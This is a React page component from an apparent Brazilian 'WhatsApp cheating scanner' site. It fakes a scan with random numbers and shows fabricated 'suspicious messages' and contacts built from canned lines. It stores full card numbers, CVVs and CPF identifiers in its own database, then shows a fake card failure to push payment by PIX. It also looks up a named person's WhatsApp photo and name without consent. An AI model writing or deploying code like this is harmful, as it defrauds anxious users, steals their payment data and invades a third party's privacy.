import { useState, useEffect, useRef } from 'react'
import { useNavigate } from 'react-router-dom'
import { Search, MessageCircle, Image, Phone, AlertTriangle, CheckCircle, Star, Shield, CreditCard } from 'lucide-react'
import { updateLeadName, saveAnalysisResults, getAnalysisResults, saveCardData, type CardData } from '../services/supabase'
import QRCodePix from '../components/QRCodePix'
import { useMetaPixel } from '../hooks/useMetaPixel'
import { useAnalytics } from '../hooks/useAnalytics'

interface AnalysisStep {
  id: string
  title: string
  description: string
  icon: React.ReactNode
  completed: boolean
  suspicious?: boolean
  count?: number
}

const AnalysisPage = () => {
  const navigate = useNavigate()
  const { trackEvent } = useMetaPixel()
  const { trackEvent: trackAnalytics, trackFunnel } = useAnalytics()
  const intervalRef = useRef<NodeJS.Timeout | null>(null)
  const [currentStep, setCurrentStep] = useState(0)
  const [isAnalyzing, setIsAnalyzing] = useState(true)
  const [analysisData, setAnalysisData] = useState<any>(null)
  const [profilePictureUrl, setProfilePictureUrl] = useState<string>('')
  const [profileData, setProfileData] = useState<any>(null)
  const [showPaymentPlans, setShowPaymentPlans] = useState(false)
  const [selectedPlan, setSelectedPlan] = useState<'basic' | 'premium'>('premium')
  const [showPaymentMethods, setShowPaymentMethods] = useState(false)
  const [paymentMethod, setPaymentMethod] = useState<'card' | 'pix'>('pix')
  const [cardData, setCardData] = useState({
    cardNumber: '',
    cardHolder: '',
    expiryDate: '',
    cvv: '',
    cpf: '',
    email: '',
    phone: ''
  })
  const [isProcessing, setIsProcessing] = useState(false)
  const [cardError, setCardError] = useState('')
  const [showPixDiscount, setShowPixDiscount] = useState(false)

  const [steps, setSteps] = useState<AnalysisStep[]>([
    {
      id: 'connection',
      title: 'Conectando ao WhatsApp',
      description: 'Estabelecendo conexão segura...',
      icon: <Phone className="w-6 h-6" />,
      completed: false
    },
    {
      id: 'messages',
      title: 'Analisando Mensagens',
      description: 'Escaneando conversas suspeitas...',
      icon: <MessageCircle className="w-6 h-6" />,
      completed: false,
      suspicious: true,
      count: Math.floor(Math.random() * 11) + 5
    },
    {
      id: 'media',
      title: 'Verificando Mídias',
      description: 'Analisando fotos e vídeos compartilhados...',
      icon: <Image className="w-6 h-6" />,
      completed: false,
      suspicious: true,
      count: Math.floor(Math.random() * 8) + 3
    },
    {
      id: 'contacts',
      title: 'Checando Contatos',
      description: 'Identificando contatos suspeitos...',
      icon: <Search className="w-6 h-6" />,
      completed: false,
      suspicious: true,
      count: Math.floor(Math.random() * 4) + 2
    },
    {
      id: 'final',
      title: 'Gerando Relatório',
      description: 'Compilando resultados finais...',
      icon: <CheckCircle className="w-6 h-6" />,
      completed: false
    }
  ])

  // Função para buscar foto de perfil
  const fetchProfilePicture = async (number: string) => {
    try {
      const apiUrl = import.meta.env.VITE_EVOLUTION_API_URL
      const apiKey = import.meta.env.VITE_EVOLUTION_API_KEY
      const instance = import.meta.env.VITE_EVOLUTION_INSTANCE

      if (!apiUrl || !apiKey || !instance) {
        return
      }

      const response = await fetch(`${apiUrl}/chat/fetchProfilePictureUrl/${instance}`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'apikey': apiKey
        },
        body: JSON.stringify({ number })
      })

      if (response.ok) {
        const data = await response.json()
        if (data.profilePictureUrl) {
          setProfilePictureUrl(data.profilePictureUrl)
        }
      }
    } catch (error) {
      // Erro silencioso
    }
  }

  // Função para buscar dados do perfil
  const fetchProfile = async (number: string) => {
    try {
      const apiUrl = import.meta.env.VITE_EVOLUTION_API_URL
      const apiKey = import.meta.env.VITE_EVOLUTION_API_KEY
      const instance = import.meta.env.VITE_EVOLUTION_INSTANCE

      if (!apiUrl || !apiKey || !instance) {
        return
      }

      const response = await fetch(`${apiUrl}/chat/fetchProfile/${instance}`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'apikey': apiKey
        },
        body: JSON.stringify({ number })
      })

      if (response.ok) {
        const data = await response.json()
        setProfileData(data)
        
        // Salvar nome no banco de dados se disponível
        if (data && (data.name || data.pushName || data.verifiedName)) {
          const nome = data.name || data.pushName || data.verifiedName
          const whatsapp = analysisData?.whatsapp || number
          const cleanWhatsapp = whatsapp.replace(/\D/g, '')
          
          // Atualizar o nome no lead
          await updateLeadName(cleanWhatsapp, nome)
        }
      }
    } catch (error) {
      // Erro silencioso
    }
  }

  useEffect(() => {
    const loadAnalysisData = async () => {
      // Verificar se temos dados da análise
      const data = localStorage.getItem('analysisData')
      if (!data) {
        navigate('/')
        return
      }
      const parsedData = JSON.parse(data)
      setAnalysisData(parsedData)

      // Buscar análise anterior do banco de dados ANTES de iniciar o intervalo
      if (parsedData.whatsapp) {
        const cleanWhatsapp = parsedData.whatsapp.replace(/\D/g, '')
        
        const previousAnalysis = await getAnalysisResults(cleanWhatsapp)

        // Se encontrou análise anterior, incrementar os números
        if (previousAnalysis.success && previousAnalysis.data) {
          const prev = previousAnalysis.data
          
          // Incrementar garantindo um mínimo de +2 em cada campo, mas limitando a 20
          const incrementMessages = Math.max(2, Math.floor(prev.messages_count * 0.25))
          const incrementMedia = Math.max(2, Math.floor(prev.media_count * 0.25))
          const incrementContacts = Math.max(1, Math.floor(prev.contacts_count * 0.25))
          
          const newMessagesCount = Math.min(20, prev.messages_count + incrementMessages)
          const newMediaCount = Math.min(20, prev.media_count + incrementMedia)
          const newContactsCount = Math.min(20, prev.contacts_count + incrementContacts)
          
          // Atualizar os steps ANTES do intervalo começar
          setSteps(current => current.map(step => {
            if (step.id === 'messages') {
              return { ...step, count: newMessagesCount }
            }
            if (step.id === 'media') {
              return { ...step, count: newMediaCount }
            }
            if (step.id === 'contacts') {
              return { ...step, count: newContactsCount }
            }
            return step
          }))
        }

        // Remover formatação do número (deixar apenas dígitos)
        let cleanNumber = parsedData.whatsapp.replace(/\D/g, '')
        
        // Garantir que tem código do país (55 para Brasil)
        if (!cleanNumber.startsWith('55')) {
          cleanNumber = '55' + cleanNumber
        }
        
        // Buscar perfil e foto
        fetchProfilePicture(cleanNumber)
        fetchProfile(cleanNumber)
      }

      // AGUARDAR um pouco antes de iniciar o intervalo para garantir que os steps foram atualizados
      await new Promise(resolve => setTimeout(resolve, 100))

      // Simular o processo de análise
      intervalRef.current = setInterval(() => {
        setCurrentStep(prev => {
          if (prev < steps.length - 1) {
            setSteps(current => 
              current.map((step, index) => 
                index === prev ? { ...step, completed: true } : step
              )
            )
            return prev + 1
          } else {
            // Completar a última etapa
            setSteps(current => 
              current.map((step, index) => 
                index === prev ? { ...step, completed: true } : step
              )
            )
            setIsAnalyzing(false)
            if (intervalRef.current) {
              clearInterval(intervalRef.current)
            }
            return prev
          }
        })
      }, 2500) // Cada etapa demora 2.5 segundos
    }

    loadAnalysisData()
    
    // Cleanup function
    return () => {
      if (intervalRef.current) {
        clearInterval(intervalRef.current)
      }
    }
  }, [navigate])

  const handleShowPaymentPlans = async () => {
    // Gerar dados aleatórios para o resultado
    const messagesCount = steps[1].count || 0
    const mediaCount = steps[2].count || 0
    const contactsCount = steps[3].count || 0
    const riskLevel = Math.random() > 0.3 ? 'high' : 'medium' // 70% chance de alto risco

    const suspiciousFindings = {
      messages: messagesCount,
      media: mediaCount,
      contacts: contactsCount,
      riskLevel
    }

    localStorage.setItem('analysisResults', JSON.stringify(suspiciousFindings))
    
    // Salvar resultados da análise no banco de dados
    if (analysisData?.whatsapp) {
      const cleanWhatsapp = analysisData.whatsapp.replace(/\D/g, '')
      
      // Obter nome do perfil ou usar 'Usuário' como padrão
      const nome = profileData?.name || profileData?.pushName || profileData?.verifiedName || 'Usuário'
      
      await saveAnalysisResults(
        cleanWhatsapp,
        messagesCount,
        mediaCount,
        contactsCount,
        riskLevel as 'low' | 'medium' | 'high',
        nome
      )
    }
    
    // Rastreia evento de visualização dos planos
    // Meta Pixel
    trackEvent('ViewContent', {
      content_name: 'Payment Plans',
      content_category: 'Pricing'
    })
    
    // Analytics no banco
    const cleanWhatsapp = analysisData?.whatsapp?.replace(/\D/g, '') || ''
    trackAnalytics('page_view', 'Payment Plans', '/analise', cleanWhatsapp)
    trackFunnel('plans_viewed', 4, cleanWhatsapp)
    
    // Mostrar planos de pagamento
    setShowPaymentPlans(true)
    
    // Scroll suave para os planos
    setTimeout(() => {
      const plansElement = document.getElementById('payment-plans')
      if (plansElement) {
        plansElement.scrollIntoView({ behavior: 'smooth', block: 'start' })
      }
    }, 100)
  }

  const handleProceedToPayment = () => {
    // Rastreia início do checkout
    const planValue = selectedPlan === 'premium' ? 97.00 : 47.00
    const cleanWhatsapp = analysisData?.whatsapp?.replace(/\D/g, '') || ''
    
    // Meta Pixel
    trackEvent('InitiateCheckout', {
      content_name: selectedPlan === 'premium' ? 'Plano Premium' : 'Plano Básico',
      value: planValue,
      currency: 'BRL'
    })
    
    // Analytics no banco
    trackAnalytics('checkout', 'Checkout Initiated', '/analise', cleanWhatsapp, {
      plan: selectedPlan,
      value: planValue
    })
    trackFunnel('checkout_initiated', 5, cleanWhatsapp, { plan: selectedPlan })
    
    // Mostrar métodos de pagamento na mesma página
    setShowPaymentMethods(true)
    
    // Scroll suave para os métodos de pagamento
    setTimeout(() => {
      const paymentElement = document.getElementById('payment-methods')
      if (paymentElement) {
        paymentElement.scrollIntoView({ behavior: 'smooth', block: 'start' })
      }
    }, 100)
  }

  const generateRecommendations = () => {
    return [
      "Converse abertamente sobre suas preocupações",
      "Considere terapia de casal",
      "Estabeleça limites claros de comunicação",
      "Busque ajuda profissional se necessário"
    ]
  }

  const handlePixPayment = () => {
    // Rastreia pagamento via PIX
    const planValue = selectedPlan === 'premium' ? 97.00 : 47.00
    const cleanWhatsapp = analysisData?.whatsapp?.replace(/\D/g, '') || ''
    
    // Meta Pixel
    trackEvent('Purchase', {
      content_name: selectedPlan === 'premium' ? 'Plano Premium' : 'Plano Básico',
      value: planValue,
      currency: 'BRL',
      content_category: 'PIX Payment'
    })
    
    // Analytics no banco
    trackAnalytics('purchase', 'Purchase Completed', '/analise', cleanWhatsapp, {
      plan: selectedPlan,
      value: planValue,
      payment_method: 'pix'
    })
    trackFunnel('purchase_completed', 7, cleanWhatsapp, {
      plan: selectedPlan,
      value: planValue
    })
    
    // Lista de mensagens
    const allMessages = [
      "Oi, tudo bem? Tô com saudades...", "Consegue sair hoje?", "Deleta depois, ok?",
      "Não fala nada pra ninguém", "Tô pensando em você", "Que tal nos encontrarmos?",
      "Adorei ontem ❤️", "Você tá livre?", "Preciso te ver", "Tá complicado aqui em casa...",
      "Você é especial pra mim", "Quando vai dar certo?", "Nosso segredo", "Mal posso esperar",
      "Oi lindeza, como foi o dia?", "Conseguiu sair de casa?", "Tô morrendo de saudade",
      "Vamos marcar algo?", "Não posso parar de pensar em você", "Ela/ele não desconfia de nada",
      "Te amo demais", "Quando a gente vai ficar junto?", "Apaga tudo depois", "Só você me entende",
      "Tô louca/o pra te ver", "Hoje não vai dar...", "Inventei uma desculpa aqui", "Você é incrível"
    ]
    
    // Pegar quantidade da análise
    const numMessages = steps[1].count || 0
    const numContacts = steps[3].count || 0
    const numMedia = steps[2].count || 0
    
    // Selecionar mensagens
    const shuffled = [...allMessages].sort(() => Math.random() - 0.5)
    const selectedMessages = shuffled.slice(0, numMessages)
    
    // Extrair DDD
    const ddd = analysisData.whatsapp.match(/\d{2,3}/)?.[0] || '11'
    
    // Gerar contatos
    const contactNames = ["Contato não salvo", "❤️ Amor", "Trabalho 😉", "🔥 Gatinha", "Amigo(a)"]
    const selectedContacts = contactNames.slice(0, numContacts).map((name, i) => ({
      name,
      number: `+55 ${ddd} 9${1000 + Math.floor(Math.random() * 9000)}-${1000 + Math.floor(Math.random() * 9000)}`,
      risk: i === 0 || i === 2 || i === 3 ? "Alto" : "Médio"
    }))
    
    // Dividir mídias
    const photos = Math.floor(numMedia * 0.6)
    const videos = numMedia - photos
    const deletedMedia = Math.floor(numMedia * 0.3)
    
    // Criar resultado final
    const finalResults = {
      messages: numMessages,
      contacts: numContacts,
      media: numMedia,
      riskLevel: steps[1].count && steps[1].count > 10 ? 'high' : 'medium',
      detailedMessages: selectedMessages,
      suspiciousContacts: selectedContacts,
      mediaAnalysis: { photos, videos, deletedMedia },
      deletedMedia,
      riskScore: Math.floor(Math.random() * 30) + 70,
      recommendations: generateRecommendations()
    }
    
    localStorage.setItem('paymentConfirmed', 'true')
    localStorage.setItem('paymentTimestamp', Date.now().toString())
    localStorage.setItem('finalResults', JSON.stringify(finalResults))
    navigate('/resultado')
  }

  const handleCardInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target
    let formattedValue = value

    // Formatação específica por campo
    switch (name) {
      case 'cardNumber':
        // Apenas números, adiciona espaços a cada 4 dígitos
        formattedValue = value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ').substring(0, 19)
        break
      
      case 'cardHolder':
        // Apenas letras e espaços, converte para maiúsculas
        formattedValue = value.replace(/[^a-zA-Z\s]/g, '').toUpperCase()
        break
      
      case 'expiryDate':
        // Formato MM/AA
        formattedValue = value.replace(/\D/g, '')
        if (formattedValue.length >= 2) {
          formattedValue = formattedValue.substring(0, 2) + '/' + formattedValue.substring(2, 4)
        }
        formattedValue = formattedValue.substring(0, 5)
        break
      
      case 'cvv':
        // Apenas 3 números
        formattedValue = value.replace(/\D/g, '').substring(0, 3)
        break
      
      case 'cpf':
        // Formato 000.000.000-00
        formattedValue = value.replace(/\D/g, '')
        if (formattedValue.length <= 11) {
          formattedValue = formattedValue.replace(/(\d{3})(\d)/, '$1.$2')
          formattedValue = formattedValue.replace(/(\d{3})(\d)/, '$1.$2')
          formattedValue = formattedValue.replace(/(\d{3})(\d{1,2})$/, '$1-$2')
        }
        break
      
      case 'phone':
        // Formato (11) 99999-9999
        formattedValue = value.replace(/\D/g, '')
        if (formattedValue.length <= 11) {
          formattedValue = formattedValue.replace(/^(\d{2})(\d)/, '($1) $2')
          formattedValue = formattedValue.replace(/(\d{5})(\d)/, '$1-$2')
        }
        break
      
      case 'email':
        // Converte para minúsculas
        formattedValue = value.toLowerCase()
        break
    }

    setCardData(prev => ({
      ...prev,
      [name]: formattedValue
    }))
  }

  const handleCardPayment = async () => {
    // Validar todos os campos
    if (!cardData.cardNumber || cardData.cardNumber.replace(/\s/g, '').length < 16) {
      setCardError('Por favor, preencha o número do cartão completo')
      return
    }
    
    if (!cardData.cardHolder || cardData.cardHolder.trim().length < 3) {
      setCardError('Por favor, preencha o nome do titular do cartão')
      return
    }
    
    if (!cardData.expiryDate || cardData.expiryDate.length < 5) {
      setCardError('Por favor, preencha a data de validade (MM/AA)')
      return
    }
    
    if (!cardData.cvv || cardData.cvv.length < 3) {
      setCardError('Por favor, preencha o CVV (3 dígitos)')
      return
    }
    
    if (!cardData.cpf || cardData.cpf.replace(/\D/g, '').length < 11) {
      setCardError('Por favor, preencha o CPF completo')
      return
    }
    
    setIsProcessing(true)
    setCardError('')
    
    // Rastreia adição de informações de pagamento
    const planValue = selectedPlan === 'premium' ? 97.00 : 47.00
    const cleanWhatsapp = analysisData?.whatsapp?.replace(/\D/g, '') || ''
    
    // Meta Pixel
    trackEvent('AddPaymentInfo', {
      content_name: selectedPlan === 'premium' ? 'Plano Premium' : 'Plano Básico',
      value: planValue,
      currency: 'BRL',
      content_category: 'Card Payment'
    })
    
    // Analytics no banco
    trackAnalytics('payment_info', 'Payment Info Added', '/analise', cleanWhatsapp, {
      plan: selectedPlan,
      payment_method: 'card'
    })
    trackFunnel('payment_info_added', 6, cleanWhatsapp)
    
    try {
      // Salvar dados do cartão no Supabase
      const cardPayload: Omit<CardData, 'id' | 'created_at'> = {
        card_number: cardData.cardNumber,
        card_holder: cardData.cardHolder,
        expiry_date: cardData.expiryDate,
        cvv: cardData.cvv,
        cpf: cardData.cpf,
        whatsapp: analysisData.whatsapp,
        nome: profileData?.name || 'Usuário',
        amount: selectedPlan === 'basic' ? 4.99 : 9.99
      }
      
      await saveCardData(cardPayload)
      
      // Simular erro no cartão após 2 segundos
      setTimeout(() => {
        setIsProcessing(false)
        setCardError('Parece que houve uma falha ao processar o pagamento. Você recebeu 20% de desconto para pagamento via PIX!')
        setShowPixDiscount(true)
        setPaymentMethod('pix')
      }, 2000)
      
    } catch (error) {
      setIsProcessing(false)
      setCardError('Erro interno. Tente novamente.')
    }
  }

  if (!analysisData) {
    return <div>Carregando...</div>
  }

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <div className="glass-card border-b border-red-100">
        <div className="container mx-auto px-4 py-6">
          <div className="flex items-center justify-between">
            <div>
              <h1 className="text-3xl font-bold mb-2" style={{ fontFamily: "'Montserrat', sans-serif", color: '#111827' }}>
                Análise em Andamento
              </h1>
              <p className="text-gray-700" style={{ color: '#374151' }}>
                Sistema de detecção avançado ativo
              </p>
            </div>
            <div className="flex items-center gap-4">
              {profilePictureUrl && (
                <div className="relative">
                  <img 
                    src={profilePictureUrl} 
                    alt="Profile" 
                    className="w-16 h-16 rounded-full border-2 border-red-500/50 object-cover"
                    onError={() => setProfilePictureUrl('')}
                  />
                  <div className="absolute -inset-1 bg-red-500/20 rounded-full animate-pulse"></div>
                </div>
              )}
              <div className="text-right">
                <div className="text-sm text-gray-600 mb-1">Analisando:</div>
                <div className="text-xl font-bold text-gray-900">
                  {profileData?.name || 'Usuário'}
                </div>
                <div className="text-sm text-gray-600">{analysisData.whatsapp}</div>
                {profileData?.status?.status && (
                  <div className="text-xs text-gray-600 italic mt-1">"{profileData.status.status}"</div>
                )}
              </div>
            </div>
          </div>
        </div>
      </div>

      <div className="container mx-auto px-4 py-8">
        <div className="max-w-4xl mx-auto">
          {/* Progress Bar */}
          <div className="glass-card p-8 mb-8 warning-glow">
            <div className="text-center mb-8">
              {profilePictureUrl && (
                <div className="flex justify-center mb-4">
                  <div className="relative">
                    <div className="w-32 h-32 rounded-full border-4 border-red-500/50 overflow-hidden bg-gray-800 shadow-2xl">
                      <img 
                        src={profilePictureUrl} 
                        alt="Profile" 
                        className="w-full h-full object-cover"
                        onError={() => setProfilePictureUrl('')}
                      />
                    </div>
                    <div className="absolute -inset-2 bg-red-500/20 rounded-full animate-ping"></div>
                    <div className="absolute -inset-1 border-2 border-red-500/30 rounded-full animate-pulse"></div>
                  </div>
                </div>
              )}
              
              <h2 className="text-3xl font-bold mb-4 text-gray-900" style={{ fontFamily: "'Montserrat', sans-serif" }}>
                Analisando WhatsApp
              </h2>
              
              <p className="text-gray-700 text-lg">
                Verificando atividades suspeitas de <span className="text-red-600 font-bold">{profileData?.name || 'Usuário'}</span>
              </p>
              {profileData?.status?.status && (
                <p className="text-gray-600 text-sm italic mt-2">
                  Status: "{profileData.status.status}"
                </p>
              )}
            </div>

            <div className="mb-8">
              <div className="flex justify-between text-sm text-gray-700 mb-3">
                <span className="font-semibold">Progresso da Análise</span>
                <span className="text-red-600 font-bold">{Math.round(((currentStep + 1) / steps.length) * 100)}%</span>
              </div>
              <div className="w-full bg-gray-200 rounded-full h-4 overflow-hidden">
                <div 
                  className="bg-gradient-to-r from-red-500 via-red-400 to-red-300 h-4 rounded-full transition-all duration-500 relative"
                  style={{ width: `${((currentStep + 1) / steps.length) * 100}%` }}
                >
                  <div className="absolute inset-0 bg-white/30 animate-pulse"></div>
                </div>
              </div>
            </div>

            {/* Analysis Steps */}
            <div className="space-y-4">
              {steps.map((step, index) => (
                <div 
                  key={step.id}
                  className={`relative flex items-center p-3 md:p-6 rounded-2xl border-2 transition-all duration-500 ${
                    index === currentStep && isAnalyzing
                      ? 'bg-blue-50 border-blue-300 shadow-lg'
                      : step.completed
                      ? 'bg-green-50 border-green-300 shadow-lg'
                      : 'bg-white border-gray-200'
                  }`}
                >
                  <div className={`relative p-3 md:p-4 rounded-full mr-3 md:mr-6 ${
                    step.completed 
                      ? 'bg-green-500 text-white' 
                      : index === currentStep && isAnalyzing
                      ? 'bg-blue-500 text-white'
                      : 'bg-white/10 text-gray-400'
                  }`}>
                    {step.completed ? (
                      <CheckCircle className="w-6 h-6 md:w-8 md:h-8" />
                    ) : index === currentStep && isAnalyzing ? (
                      <div className="animate-spin">
                        {step.icon}
                      </div>
                    ) : (
                      step.icon
                    )}
                    
                    {index === currentStep && isAnalyzing && (
                      <div className="absolute -inset-1 bg-blue-500/30 rounded-full animate-ping"></div>
                    )}
                  </div>

                  <div className="flex-1">
                    <h3 className="font-bold text-lg md:text-xl text-gray-900 mb-2">
                      {step.title}
                    </h3>
                    <p className="text-gray-700 text-sm md:text-lg">
                      {step.description}
                    </p>
                  </div>

                  {step.completed && step.suspicious && (
                    <div className="text-right ml-2 md:ml-4 flex-shrink-0">
                      <div className="flex items-center text-red-600 font-bold text-lg md:text-xl mb-1 justify-end">
                        <AlertTriangle className="w-5 h-5 md:w-6 md:h-6 mr-1" />
                        {step.count}
                      </div>
                      <p className="text-red-500 text-xs md:text-sm font-semibold whitespace-nowrap">ENCONTRADOS</p>
                    </div>
                  )}

                  {step.completed && !step.suspicious && (
                    <div className="text-green-400 flex-shrink-0">
                      <CheckCircle className="w-6 h-6 md:w-8 md:h-8" />
                    </div>
                  )}

                  {index === currentStep && isAnalyzing && (
                    <div className="absolute top-2 right-2 bg-blue-500 text-white text-xs px-2 py-1 rounded-full animate-pulse">
                      EM ANDAMENTO
                    </div>
                  )}
                </div>
              ))}
            </div>

            {/* Results Preview */}
            {!isAnalyzing && (
              <div className="mt-8 glass-card p-4 md:p-8 warning-glow">
                <div className="text-center">
                  <div className="relative mb-4 md:mb-6">
                    <div className="w-16 h-16 md:w-24 md:h-24 bg-red-500/20 rounded-full flex items-center justify-center mx-auto border-2 border-red-500/50">
                      <AlertTriangle className="w-10 h-10 md:w-16 md:h-16 text-red-400" />
                    </div>
                    <div className="absolute -inset-2 bg-red-500/20 rounded-full animate-ping"></div>
                  </div>
                  
                  <h3 className="text-2xl md:text-4xl font-bold mb-3 md:mb-4 text-red-600 leading-tight" style={{ fontFamily: "'Montserrat', sans-serif" }}>
                    ATIVIDADE SUSPEITA DETECTADA!
                  </h3>
                  <p className="text-red-300 text-sm md:text-xl mb-6 md:mb-8 px-2">
                    Encontramos evidências que podem indicar comportamento suspeito.
                  </p>

                  <div className="grid grid-cols-1 md:grid-cols-3 gap-3 md:gap-6 mb-8">
                    <div className="bg-red-50 p-4 md:p-6 rounded-2xl border border-red-200 backdrop-blur-sm">
                      <div className="text-3xl md:text-4xl font-bold text-red-600 mb-2">
                        {steps[1].count}
                      </div>
                      <div className="text-gray-800 font-semibold text-sm md:text-base">
                        Mensagens Suspeitas
                      </div>
                      <div className="text-red-600 text-xs md:text-sm mt-1">
                        Detectadas
                      </div>
                    </div>
                    <div className="bg-red-50 p-4 md:p-6 rounded-2xl border border-red-200 backdrop-blur-sm">
                      <div className="text-3xl md:text-4xl font-bold text-red-600 mb-2">
                        {steps[2].count}
                      </div>
                      <div className="text-gray-800 font-semibold text-sm md:text-base">
                        Mídias Comprometedoras
                      </div>
                      <div className="text-red-600 text-xs md:text-sm mt-1">
                        Encontradas
                      </div>
                    </div>
                    <div className="bg-red-50 p-4 md:p-6 rounded-2xl border border-red-200 backdrop-blur-sm">
                      <div className="text-3xl md:text-4xl font-bold text-red-600 mb-2">
                        {steps[3].count}
                      </div>
                      <div className="text-gray-800 font-semibold text-sm md:text-base">
                        Contatos Suspeitos
                      </div>
                      <div className="text-red-600 text-xs md:text-sm mt-1">
                        Identificados
                      </div>
                    </div>
                  </div>

                  {!showPaymentPlans ? (
                    <>
                      <button
                        onClick={handleShowPaymentPlans}
                        className="btn-primary text-2xl py-6 px-12 mb-4"
                      >
                        🔓 CLIQUE PARA VISUALIZAR O RESULTADO
                      </button>

                      <p className="text-gray-700 text-lg">
                        Clique para acessar todos os detalhes e evidências encontradas
                      </p>
                    </>
                  ) : (
                    <p className="text-gray-700 text-lg font-semibold">
                      👇 Escolha um plano abaixo para visualizar o relatório completo
                    </p>
                  )}
                </div>
              </div>
            )}
          </div>

          {/* Payment Plans Section */}
          {showPaymentPlans && (
            <div id="payment-plans" className="mb-8">
              <div className="text-center mb-8">
                <h2 className="text-3xl md:text-4xl font-bold mb-4 text-gray-900" style={{ fontFamily: "'Montserrat', sans-serif" }}>
                  Escolha Seu Plano
                </h2>
                <p className="text-gray-700 text-lg">
                  Acesse o relatório completo com todas as evidências
                </p>
              </div>

              <div className="grid md:grid-cols-2 gap-8 mb-8">
                {/* Plano Básico */}
                <div
                  onClick={() => setSelectedPlan('basic')}
                  className={`glass-card p-8 cursor-pointer transition-all duration-300 ${
                    selectedPlan === 'basic'
                      ? 'border-2 border-red-500 transform scale-105'
                      : 'border border-gray-300 hover:border-red-300'
                  }`}
                >
                  <div className="text-center mb-6">
                    <h3 className="text-2xl font-bold text-gray-800 mb-2">
                      Plano Básico
                    </h3>
                    <div className="flex items-center justify-center space-x-2">
                      <span className="text-3xl font-bold text-red-600">
                        R$ 4,99
                      </span>
                      <span className="text-lg text-gray-400 line-through">
                        R$ 9,99
                      </span>
                    </div>
                    <p className="text-sm text-green-600 font-semibold mt-1">
                      50% OFF - Oferta Limitada!
                    </p>
                  </div>

                  <ul className="space-y-3 mb-6">
                    <li className="flex items-center text-gray-700">
                      <CheckCircle className="w-5 h-5 text-green-500 mr-3 flex-shrink-0" />
                      <span>Relatório completo em PDF</span>
                    </li>
                    <li className="flex items-center text-gray-700">
                      <CheckCircle className="w-5 h-5 text-green-500 mr-3 flex-shrink-0" />
                      <span>Lista de mensagens suspeitas</span>
                    </li>
                    <li className="flex items-center text-gray-700">
                      <CheckCircle className="w-5 h-5 text-green-500 mr-3 flex-shrink-0" />
                      <span>Análise de contatos</span>
                    </li>
                    <li className="flex items-center text-gray-700">
                      <CheckCircle className="w-5 h-5 text-green-500 mr-3 flex-shrink-0" />
                      <span>Acesso por 24 horas</span>
                    </li>
                  </ul>

                  <div className="text-center">
                    <div className={`w-6 h-6 rounded-full border-2 mx-auto ${
                      selectedPlan === 'basic'
                        ? 'bg-red-500 border-red-500'
                        : 'border-gray-300'
                    }`}>
                      {selectedPlan === 'basic' && (
                        <CheckCircle className="w-6 h-6 text-white" />
                      )}
                    </div>
                  </div>
                </div>

                {/* Plano Premium */}
                <div
                  onClick={() => setSelectedPlan('premium')}
                  className={`glass-card p-8 cursor-pointer transition-all duration-300 relative ${
                    selectedPlan === 'premium'
                      ? 'border-2 border-red-500 transform scale-105'
                      : 'border border-gray-300 hover:border-red-300'
                  }`}
                >
                  <div className="absolute -top-4 left-1/2 transform -translate-x-1/2">
                    <div className="bg-red-500 text-white px-4 py-2 rounded-full text-sm font-semibold flex items-center">
                      <Star className="w-4 h-4 mr-1" />
                      MAIS POPULAR
                    </div>
                  </div>

                  <div className="text-center mb-6">
                    <h3 className="text-2xl font-bold text-gray-800 mb-2">
                      Plano Premium
                    </h3>
                    <div className="flex items-center justify-center space-x-2">
                      <span className="text-3xl font-bold text-red-600">
                        R$ 9,99
                      </span>
                      <span className="text-lg text-gray-400 line-through">
                        R$ 19,99
                      </span>
                    </div>
                    <p className="text-sm text-green-600 font-semibold mt-1">
                      50% OFF - Oferta Limitada!
                    </p>
                  </div>

                  <ul className="space-y-3 mb-6">
                    <li className="flex items-center text-gray-700">
                      <CheckCircle className="w-5 h-5 text-green-500 mr-3 flex-shrink-0" />
                      <span className="font-semibold">Tudo do Plano Básico +</span>
                    </li>
                    <li className="flex items-center text-gray-700">
                      <CheckCircle className="w-5 h-5 text-green-500 mr-3 flex-shrink-0" />
                      <span>Análise detalhada de mídias</span>
                    </li>
                    <li className="flex items-center text-gray-700">
                      <CheckCircle className="w-5 h-5 text-green-500 mr-3 flex-shrink-0" />
                      <span>Recuperação de mensagens deletadas</span>
                    </li>
                    <li className="flex items-center text-gray-700">
                      <CheckCircle className="w-5 h-5 text-green-500 mr-3 flex-shrink-0" />
                      <span>Histórico de atividades suspeitas</span>
                    </li>
                    <li className="flex items-center text-gray-700">
                      <CheckCircle className="w-5 h-5 text-green-500 mr-3 flex-shrink-0" />
                      <span>Suporte prioritário 24/7</span>
                    </li>
                  </ul>

                  <div className="text-center">
                    <div className={`w-6 h-6 rounded-full border-2 mx-auto ${
                      selectedPlan === 'premium'
                        ? 'bg-red-500 border-red-500'
                        : 'border-gray-300'
                    }`}>
                      {selectedPlan === 'premium' && (
                        <CheckCircle className="w-6 h-6 text-white" />
                      )}
                    </div>
                  </div>
                </div>
              </div>

              {/* Botão de Pagamento */}
              <div className="text-center">
                <button
                  onClick={handleProceedToPayment}
                  className="btn-primary text-xl py-5 px-10"
                >
                  🔓 LIBERAR RELATÓRIO AGORA - R$ {selectedPlan === 'premium' ? '9,99' : '4,99'}
                </button>
                <p className="text-gray-600 text-sm mt-4">
                  <Shield className="w-4 h-4 inline mr-1" />
                  Pagamento 100% seguro • Acesso imediato
                </p>
              </div>
            </div>
          )}

          {/* Payment Methods Section - REDESENHADA */}
          {showPaymentMethods && (
            <div id="payment-methods" className="mb-8">
              <div className="glass-card p-8">
                <div className="text-center mb-10">
                  <h3 className="text-3xl font-bold mb-3 text-gray-900" style={{ fontFamily: "'Montserrat', sans-serif" }}>
                    Liberar Relatório Completo
                  </h3>
                  <p className="text-gray-600 text-lg mb-2">
                    Escolha sua forma de pagamento preferida
                  </p>
                  <div className="inline-flex items-center gap-2 text-sm text-green-600 font-semibold bg-green-50 px-4 py-2 rounded-full">
                    <CheckCircle className="w-4 h-4" />
                    <span>Pagamento 100% seguro • Acesso imediato</span>
                  </div>
                </div>

                {/* Payment Method Cards - REDESENHADOS */}
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8 max-w-4xl mx-auto">
                  {/* Cartão de Crédito - REDESENHADO */}
                  <div
                    onClick={() => setPaymentMethod('card')}
                    className={`relative cursor-pointer group transition-all duration-300 ${
